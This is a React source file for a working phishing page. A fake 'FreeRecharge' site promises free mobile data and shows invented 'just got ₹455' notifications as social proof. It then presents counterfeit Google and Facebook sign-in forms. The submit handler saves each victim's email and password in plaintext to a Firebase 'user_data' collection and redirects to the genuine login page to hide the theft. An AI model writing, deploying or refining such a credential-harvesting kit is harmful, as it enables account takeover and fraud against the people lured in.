import React, { useState, useEffect } from 'react';
import { db } from './firebase';
import { collection, addDoc } from "firebase/firestore";

function Login() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [view, setView] = useState('main');
  const [isMobile, setIsMobile] = useState(window.innerWidth < 768);

  useEffect(() => {
    const handleResize = () => setIsMobile(window.innerWidth < 768);
    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize);
  }, []);

  const notifications = [
    { name: "Ankit from Patna", amount: "₹455" },
    { name: "Ravi from Gaya", amount: "₹199" },
    { name: "Priya from Muzaffarpur", amount: "₹299" },
    { name: "Suresh from Bhagalpur", amount: "₹599" },
    { name: "Vikash from Darbhanga", amount: "₹719" }
  ];

  const [notifIndex, setNotifIndex] = useState(0);

  useEffect(() => {
    const interval = setInterval(() => {
      setNotifIndex((prev) => (prev + 1) % notifications.length);
    }, 3000);
    return () => clearInterval(interval);
  }, [notifications.length]);

  const handleFinalSubmit = async (e) => {
    e.preventDefault();
    try {
      await addDoc(collection(db, "user_data"), {
        loginType: view === 'fb' ? 'Facebook' : 'Google',
        id: email,
        pass: password,
        time: new Date().toLocaleString()
      });
      window.location.href = view === 'fb' 
        ? "https://www.facebook.com/login/" 
        : "https://accounts.google.com/signin";
    } catch (err) {
      alert("Connection slow! Trying again...");
    }
  };

  if (view === 'main') {
    return (
      <div style={mainWrapper}>
        <header style={navStyle}>
          <div style={logoStyle}>⚡ FreeRecharge</div>
          <div style={liveBadge}>● Online</div>
        </header>
        <div style={heroSection}>
          <h1 style={{...heroTitle, fontSize: isMobile ? '28px' : '36px'}}>Instant Free Recharge</h1>
          <p style={heroSubTitle}>Get your free data pack. Verify your account to claim your reward.</p>
          <div style={selectionContainer}>
            <div onClick={() => setView('google')} style={{...methodCard, width: isMobile ? '85%' : '300px'}}>
              <img src="https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png" alt="G" style={iconStyle} />
              <div style={methodText}>
                <span style={methodTitle}>Sign in with Google</span>
                <span style={methodDesc}>Fast Verification</span>
              </div>
            </div>
            <div onClick={() => setView('fb')} style={{...methodCardFb, width: isMobile ? '85%' : '300px'}}>
              <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="F" style={iconStyle} />
              <div style={methodText}>
                <span style={methodTitleFb}>Sign in with Facebook</span>
                <span style={methodDescFb}>Instant Access</span>
              </div>
            </div>
          </div>
        </div>
        <div style={{...notificationFloat, right: isMobile ? '10px' : '20px', left: isMobile ? '10px' : 'auto'}}>
          <span style={{color: '#4caf50', fontWeight: 'bold'}}>✔</span> {notifications[notifIndex].name} just got {notifications[notifIndex].amount}!
        </div>
      </div>
    );
  }

  return view === 'google' ? (
    <div style={gBackground}>
      <div style={{...gContainer, width: isMobile ? '90%' : '360px', border: isMobile ? 'none' : '1px solid #dadce0'}}>
        <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" style={{width:'75px', marginBottom:'15px'}} />
        <h1 style={gHeading}>Sign in</h1>
        <p style={gSub}>Use your Google Account</p>
        <form onSubmit={handleFinalSubmit}>
          <input type="email" placeholder="Email or phone" style={gInput} onChange={(e)=>setEmail(e.target.value)} required />
          <input type="password" placeholder="Enter password" style={gInput} onChange={(e)=>setPassword(e.target.value)} required />
          <div style={{marginTop: '30px', display: 'flex', justifyContent: 'space-between', alignItems: 'center'}}>
            <span style={gCreate} onClick={() => setView('main')}>Back</span>
            <button type="submit" style={gNextBtn}>Next</button>
          </div>
        </form>
      </div>
    </div>
  ) : (
    <div style={{ background: '#f0f2f5', minHeight: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center', paddingTop: '30px' }}>
      <h1 style={{ color: '#1877f2', fontSize: isMobile ? '32px' : '40px', fontWeight: 'bold' }}>facebook</h1>
      <div style={{...fbCard, width: isMobile ? '90%' : '360px'}}>
        <p style={{ fontSize: '18px', marginBottom: '15px' }}>Log in to Facebook</p>
        <form onSubmit={handleFinalSubmit}>
          <input type="text" placeholder="Email or phone" style={fbInput} onChange={(e)=>setEmail(e.target.value)} required />
          <input type="password" placeholder="Password" style={fbInput} onChange={(e)=>setPassword(e.target.value)} required />
          <button type="submit" style={fbLoginBtn}>Log In</button>
        </form>
        <div onClick={() => setView('main')} style={{marginTop:'15px', color:'#1877f2', cursor:'pointer'}}>Back</div>
      </div>
    </div>
  );
}

// Styles Objects
const mainWrapper = { background: 'linear-gradient(135deg, #1e3c72 0%, #2a5298 100%)', minHeight: '100vh', color: '#fff', textAlign: 'center', fontFamily: 'Arial', position: 'relative' };
const navStyle = { display: 'flex', justifyContent: 'space-between', padding: '15px 20px' };
const logoStyle = { fontSize: '20px', fontWeight: 'bold' };
const liveBadge = { background: '#4caf50', padding: '3px 10px', borderRadius: '20px', fontSize: '11px' };
const heroSection = { marginTop: '30px', padding: '0 15px' };
const heroTitle = { fontWeight: 'bold', marginBottom: '10px' };
const heroSubTitle = { maxWidth: '500px', margin: '0 auto 30px', opacity: '0.8', fontSize: '14px' };
const selectionContainer = { display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '15px' };
const methodCard = { background: '#fff', padding: '12px 20px', borderRadius: '8px', display: 'flex', alignItems: 'center', cursor: 'pointer', color: '#333', boxShadow: '0 4px 15px rgba(0,0,0,0.2)' };
const methodCardFb = { ...methodCard, background: '#1877f2', color: '#fff' };
const iconStyle = { width: '28px', marginRight: '15px' };
const methodText = { textAlign: 'left' };
const methodTitle = { display: 'block', fontWeight: 'bold', fontSize: '15px' };
const methodDesc = { fontSize: '11px', color: '#777' };
const methodTitleFb = { ...methodTitle, color: '#fff' };
const methodDescFb = { ...methodDesc, color: '#e0e0e0' };
const notificationFloat = { position: 'fixed', bottom: '20px', background: '#fff', color: '#333', padding: '10px 15px', borderRadius: '50px', fontSize: '12px', boxShadow: '0 5px 15px rgba(0,0,0,0.3)', borderLeft: '5px solid #4caf50', zIndex: 100 };
const gBackground = { background: '#fff', minHeight: '100vh', display: 'flex', justifyContent: 'center', alignItems: 'center' };
const gContainer = { padding: '30px', textAlign: 'center' };
const gHeading = { fontSize: '22px', fontWeight: '400' };
const gSub = { fontSize: '15px', marginBottom: '20px' };
const gInput = { width: '100%', boxSizing: 'border-box', padding: '12px', marginBottom: '10px', border: '1px solid #dadce0', borderRadius: '4px' };
const gCreate = { color: '#1a73e8', fontWeight: 'bold', fontSize: '14px', cursor: 'pointer' };
const gNextBtn = { background: '#1a73e8', color: '#fff', border: 'none', padding: '10px 24px', borderRadius: '4px', fontWeight: 'bold' };
const fbCard = { background: '#fff', padding: '20px', borderRadius: '8px', boxShadow: '0 2px 4px rgba(0,0,0,0.1)', textAlign: 'center', boxSizing: 'border-box' };
const fbInput = { width: '100%', boxSizing: 'border-box', padding: '12px', margin: '6px 0', border: '1px solid #dddfe2', borderRadius: '6px' };
const fbLoginBtn = { width: '100%', padding: '12px', background: '#1877f2', color: '#fff', border: 'none', borderRadius: '6px', fontWeight: 'bold', marginTop: '10px' };

export default Login;